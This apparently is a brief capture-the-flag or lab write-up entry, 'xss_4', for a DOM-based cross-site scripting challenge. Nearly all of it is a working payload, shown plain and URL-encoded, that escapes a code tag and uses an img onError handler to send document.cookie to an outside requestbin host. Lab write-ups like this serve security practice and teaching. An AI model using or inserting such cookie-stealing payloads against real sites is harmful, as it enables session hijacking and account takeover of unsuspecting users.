# xss_4 - DOM Based on <pre> (no `onload`, case sensitive)
- Payload (plain), `"></code><img src=x onError="document.location='http://requestbin.fullcontact.com/18kxbln1/?c='+document.cookie;"><code class="`
- Payload (URL encoded), `%22%3e%3c%2f%63%6f%64%65%3e%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%45%72%72%6f%72%3d%22%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%72%65%71%75%65%73%74%62%69%6e%2e%66%75%6c%6c%63%6f%6e%74%61%63%74%2e%63%6f%6d%2f%31%38%6b%78%62%6c%6e%31%2f%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%22%3e%3c%63%6f%64%65%20%63%6c%61%73%73%3d%22`
![](https://d2mxuefqeaa7sj.cloudfront.net/s_E2D481E3198F10AD94E0120767EA297F5AC3D36EF761F9188B556CCA1ADF3D51_1528413485452_image.png)
